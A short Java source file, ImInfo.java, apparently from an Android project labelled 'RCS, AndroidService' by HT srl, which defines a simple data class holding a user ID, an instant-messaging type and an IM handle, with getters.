/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ImInfo.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.task;

public class ImInfo {
	private static final String TAG = "ImInfo"; //$NON-NLS-1$

	private final long userId;
	private final int imType;
	private final String im;

	public ImInfo(long userId, int imType, String im) {
		this.userId = userId;
		this.imType = imType;
		this.im = im;
	}

	public long getUserId() {
		return userId;
	}

	public int getImType() {
		return imType;
	}

	public String getIm() {
		return im;
	}

}
